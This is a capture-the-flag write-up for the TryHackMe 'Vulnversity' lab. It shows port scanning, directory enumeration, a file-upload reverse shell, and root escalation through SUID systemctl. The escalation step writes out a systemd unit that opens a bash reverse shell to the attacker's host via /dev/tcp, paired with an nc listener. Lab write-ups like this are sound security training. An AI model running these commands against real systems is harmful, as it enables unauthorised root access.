https://tryhackme.com/room/vulnversity
![[Vulnversity-5.png|505x379]]

## Port Scan

[[nmap]] scan

```
┌──(azam㉿kali)-[~/Desktop/try/vulnversity]
└─$ nmap -T5 -A -Pn -sC 10.10.152.59                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 22:48 +06
Nmap scan report for 10.10.152.59
Host is up (0.18s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2025-04-20T12:48:56-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-04-20T16:48:57
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   184.74 ms 10.21.0.1
2   184.93 ms 10.10.152.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.55 seconds

```
On port 3333

![[Vulnversity.png|1436x724]]


## Directory finding

Using [[gobuster]]

```
┌──(azam㉿kali)-[~/Desktop/try/vulnversity]
└─$ gobuster dir -u http://10.10.152.59:3333 -x html,txt,php,js,py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.152.59:3333
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js,py,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 293]
/index.html           (Status: 200) [Size: 33014]
/images               (Status: 301) [Size: 320] [--> http://10.10.152.59:3333/images/]
/.html                (Status: 403) [Size: 294]
/css                  (Status: 301) [Size: 317] [--> http://10.10.152.59:3333/css/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.152.59:3333/js/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.152.59:3333/fonts/]
/internal             (Status: 301) [Size: 322] [--> http://10.10.152.59:3333/internal/]
Progress: 23194 / 1323366 (1.75%)[ERROR] Get "http://10.10.152.59:3333/ae.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 38346 / 1323366 (2.90%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 38367 / 1323366 (2.90%)
===============================================================
Finished
===============================================================
```
http://10.10.152.59:3333/internal/
![[Vulnversity-1.png]]
Here we should use `.phtml` revshell file

Make another gobuster scan
```
┌──(azam㉿kali)-[~/Desktop/try/vulnversity]
└─$ gobuster dir -u http://10.10.152.59:3333/internal -x html,txt,php,js,py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.152.59:3333/internal
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php,js,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 303]
/index.php            (Status: 200) [Size: 525]
/.php                 (Status: 403) [Size: 302]
/uploads              (Status: 301) [Size: 330] [--> http://10.10.152.59:3333/internal/uploads/]
/css                  (Status: 301) [Size: 326] [--> http://10.10.152.59:3333/internal/css/]
Progress: 189168 / 1323366 (14.29%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 189468 / 1323366 (14.32%)
===============================================================
Finished
===============================================================
```

![[Vulnversity-2.png]]

## Get Access

![[Vulnversity-3.png]]

### Find SUID

```
www-data@vulnuniversity:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

`/bin/systemctl`
can be exploit

### Exploit

make a folder name `root.service` and write the code
```
[unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.21.153.70/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
and upload to the victim machine

Then run the command in attacker machine
```
nc -lvnp 9999  
```

At lest run the command in the victim machine
```
systemctl enable /tmp/root.service
systemctl start root
```

![[Vulnversity-4.png]]


#tryhackme #tryhackme_ctf #ctf  